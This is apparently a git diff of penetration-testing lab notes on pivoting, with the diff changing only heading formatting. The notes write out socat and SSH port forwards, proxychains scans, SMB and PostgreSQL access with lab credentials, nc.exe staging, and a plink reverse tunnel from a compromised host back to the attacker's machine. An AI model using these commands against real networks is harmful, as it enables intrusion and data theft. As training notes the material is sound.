@@ -1502,7 +1502,7 @@ Reference
     `confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.124.215:22`  
   - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01  
     `ssh database_admin@192.168.124.63 -p2222`  
-- SSH Tunneling (local port forward)
+- SSH Tunneling (**local** port forward)
   - HRSHARES 172.16.114.217; PGDATABASE01 10.4.114.215; CONFLUENCE01 192.168.114.63  
   - manually mount folder in kali (share files from local to kali vm)  
     ```
@@ -1529,7 +1529,7 @@ Reference
     `kali@kali:~$ smbclient -p 4455 -L //192.168.114.63/ -U hr_admin --password=Welcome1234`
   - Listing files in the scripts share, using smbclient over our SSH local port forward running on CONFLUENCE01  
     `smbclient -p 4455 //192.168.114.63/scripts -U hr_admin --password=Welcome1234` `smb: \> ls` `smb: \> get Provisioning.ps1`
-- SSH Tunneling (dynamic port forward)  
+- SSH Tunneling (**dynamic** port forward)  
   - WAN (Kali) > DMZ (Confluence) > Internal (DB >>> HR)  
   - KALI 192.168.45.250, CONFLUENCE01 192.168.114.63, DB 10.4.114.215, HR 172.16.114.217  
   - open SSH dynamic port forward on port 9999  
@@ -1543,7 +1543,7 @@ Reference
     `proxychains smbclient -L //172.16.114.217/ -U hr_admin --password=Welcome1234`
   - scan top 20 TCP ports on 172.16.50.217 > 135, 139, 445, 3389  
     `sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.114.217`
-- SSH Tunneling (remote port forward)
+- SSH Tunneling (**remote** port forward)
   - WAN (Kali)<FW only port 8090 inbound and all outbound > DMZ (Confluence) > Internal (DB >>> HR)
   - start ssh server on kali
     `sudo systemctl start ssh`
@@ -1564,7 +1564,7 @@ Reference
     `\dt`
   - query data  
     'SELECT * FROM payroll;'
-- SSH Tunneling (remote dynamic port forward)
+- SSH Tunneling (**remote dynamic** port forward)
   - Remote dynamic port forwarding is just another instance of dynamic port forwarding, so we gain all the flexibility of traditional dynamic port forwarding. We can connect to any port on any host that CONFLUENCE01 has access to by passing SOCKS-formatted packets.
   - we pass only one socket: the socket we want to listen on the SSH server
   - Kali: 192.168.45.233, DB:10.4.133.215, MULTISERVER03: 192.168.133.64
@@ -1577,7 +1577,7 @@ Reference
     `nano /etc/proxychains4.conf` `socks5 127.0.0.1 9998`
   - Scanning MULTISERVER03 through the remote dynamic SOCKS port with Proxychains > 80, 135, 3389  
     `proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.133.64` (change to internal server 10.4.xxx.64)
-- sshuttle
+- **sshuttle**
   - sshuttle is a tool that turns an SSH connection into something like a VPN by setting up local routes that force. Requires root privileges on the SSH client and Python3 on the SSH server  
   - Forwarding port 2222 on CONFLUENCE01 to port 22 on PGDATABASE01  
     `confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`
@@ -1585,7 +1585,7 @@ Reference
     `kali@kali:~$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24`
   - Connecting to the SMB share on HRSHARES, without any explicit forwarding > scripts  
     `kali@kali:~$ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234`  
-- Port Forwarding with windows tool ssh.exe  
+- Port Forwarding with windows tool **ssh.exe**  
   - Starting SSH server on the Kali machine.  
     `kali@kali:~$ sudo systemctl start ssh`
   - Connecting to the RDP server on **MULTISERVER03** using xfreerdp  
@@ -1598,7 +1598,7 @@ Reference
     `socks5 127.0.0.1 9998`  
   - Connecting to the PostgreSQL server with psql and Proxychains  
     `kali@kali:~$ proxychains psql -h 10.4.50.215 -U postgres`  `postgres=# \l`  
-- Port Forwarding with windows tool Plink
+- Port Forwarding with windows tool **Plink**
   - MULTISERVER03 is already “pre-compromised”. Browse /umbraco/forms.aspx on MULTISERVER03 to run arbitrary commands
   - Starting Apache2  `kali@kali:~$ sudo systemctl start apache2`
   - Copying nc.exe to the Apache2 webroot  
@@ -1618,7 +1618,7 @@ Reference
     `cmd.exe /c echo y | ..exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7`
   - Connecting to the RDP server with xfreerdp, through the Plink port forward  
     `kali@kali:~$ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833`
-- Port Forwarding with windows tool Netsh (needs admin)  
+- Port Forwarding with windows tool **Netsh** (needs admin)  
   - built-in firewall configuration tool Netsh (also known as Network Shell).  
   - CONFLUENCE01 is no longer accessible. MULTISERVER03 is serving its web application on TCP port 80  
   - RDP directly into MULTISERVER03 from  Kali  
